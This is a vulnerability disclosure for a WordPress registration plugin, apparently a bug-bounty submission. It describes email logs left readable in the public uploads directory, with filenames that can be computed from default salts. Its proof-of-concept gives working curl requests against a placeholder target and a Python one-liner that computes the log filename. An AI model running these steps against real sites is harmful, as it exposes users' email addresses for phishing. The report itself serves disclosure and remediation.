=== SOFTWARE DETAILS ===

Type of Software: WordPress Plugin

Software Name: User Registration & Membership

Software Slug: user-registration

Affected Version(s): <= 5.2.8

=== VULNERABILITY DETAILS ===

Description of Vulnerability

The plugin registers a default file log handler (ur_register_default_log_handler(), functions-ur-core.php:2124-2134) that writes all plugin logs to {uploads}/ur-logs/, a directory inside the publicly-served uploads path. The email dispatcher user_registration_process_and_send_email() (class-ur-emailer.php:300-342) logs the recipient address, subject and failure details of every outgoing email (registration confirmations, password resets) with source 'ur_mail_logs'. The log filename is derived as ur_mail_logs-{wp_hash('ur_mail_logs')}.log (class-ur-log-handler-file.php:394-396), where wp_hash() is an HMAC-MD5 keyed only by the site's AUTH_KEY/AUTH_SALT.

The directory contains an .htaccess with "deny from all" (Apache-only) plus an empty index.html, but the log file itself is served over HTTP on any non-Apache stack (nginx, IIS, LiteSpeed OpenAPI), which ignores .htaccess. On such stacks the only barrier is the filename hash, which is constant per site and computed from secrets that are frequently left at well-known default values by automated installers ("put your unique phrase here", empty, "changeme"); for those installations the filename is computable offline by anyone. The log discloses registered user email addresses and email subjects in plaintext, enabling harvesting of PII and user-enumeration for targeted phishing.

Vulnerability Type: Information Disclosure

Impact Statement: Unauthenticated attackers can read plugin email logs containing registered users' email addresses (and password-reset email subjects) when the site runs a non-Apache webserver, or when the site's authentication salts are default/weak (filename computable offline).

Common Weakness (CWE) Type: CWE-538 (Insertion of Sensitive Information into Externally-Accessible File or Directory)

Authentication Level Required: No Authentication

References to Affected Code:
- https://plugins.trac.wordpress.org/browser/user-registration/trunk/includes/functions-ur-core.php (ur_register_default_log_handler)
- https://plugins.trac.wordpress.org/browser/user-registration/trunk/includes/class-ur-emailer.php (logging of recipient/subject)
- https://plugins.trac.wordpress.org/browser/user-registration/trunk/includes/log-handlers/class-ur-log-handler-file.php (get_log_file_path, wp_hash filename)
- https://plugins.trac.wordpress.org/browser/user-registration/trunk/user-registration.php (UR_LOG_DIR = uploads/ur-logs/)

References:
- https://wordpress.org/plugins/user-registration/

=== PROOF OF CONCEPT ===

Prerequisites:
- WordPress 6.7.1, PHP 8.2, User Registration 5.2.8 activated with default settings (no option to enable: the file log handler is registered by default via the user_registration_register_log_handlers filter)
- Any webserver that does not enforce .htaccess (nginx, IIS, PHP built-in server), or knowledge/weak-guessing of the site's AUTH_SECRET

Step 1 — Trigger log creation (no authentication required if registration is open):
curl -s -X POST "http://TARGET/wp-admin/admin-ajax.php" \
  -d "action=user_registration_user_form_submit&form_id=19" \
  -d 'form_data=[{"field_name":"user_login","value":"victim1"},{"field_name":"user_email","value":"victim1@example.com"},{"field_name":"user_pass","value":"Passw0rd!1234"},{"field_name":"user_confirm_password","value":"Passw0rd!1234"}]'
Expected: {"success":true,...} — a registration email for victim1@example.com is now logged.

Step 2 — Fetch the log (validated on PHP built-in server; identical on nginx):
# If salts are default/weak, compute the filename offline:
python3 -c "import hmac,hashlib;print(hmac.new(b'put your unique phrase here',b'ur_mail_logs',hashlib.md5).hexdigest())"
# → cf529820450a38fa278b56d5618d80bb (example for the WP sample-config salt)

curl -s "http://TARGET/wp-content/uploads/ur-logs/ur_mail_logs-<computed-hash>.log"
Observed output (from a live test on WordPress 6.7.1 / UR 5.2.8 / PHP 8.2):
2026-10-09T08:02:56+00:00 DEBUG Email details:{
    "to": "pwn4@audit.local",
    "subject": "Welcome to AuditSite!",
    ...
HTTP/1.1 200 OK — the log is served publicly.

Negative control:
curl -s -o /dev/null -w "%{http_code}" "http://TARGET/wp-content/uploads/ur-logs/ur_mail_logs-ffffffffffffffffffffffffffffffff.log"
Expected/observed: 404 (wrong hash) — confirming the hash is the only functional barrier on non-Apache stacks, and that Apache-only .htaccess provides no protection there.

Environment / Configuration Details: WordPress 6.7.1, PHP 8.2.34, MariaDB 11.5.2, User Registration 5.2.8 with default settings. Default registration form (ID 19). Webserver: PHP built-in (behaves like nginx: .htaccess ignored). File observed accessible at /wp-content/uploads/ur-logs/ur_mail_logs-945cf207aa69efc77b875c0b0127bad6.log immediately after one registration.

Certify PoC tested step-by-step: YES

Did you use AI? YES

=== OTHER DETAILS ===

Have you requested a CVE from another CNA? NO
Have you reported this to another vendor? NO
Terms agreement: YES

=== SUGGESTED REMEDIATION ===

1. Move UR_LOG_DIR outside the publicly-served tree (e.g. WP_CONTENT_DIR . '/ur-logs' with a random per-installation suffix), OR
2. Store logs in the database (protected by capability checks) instead of files, OR
3. At minimum, redact recipient addresses from log entries and add index.php + randomized per-installation directory name; do not rely on .htaccess (Apache-only) or on wp_hash() filename secrecy keyed by salts that are frequently default.
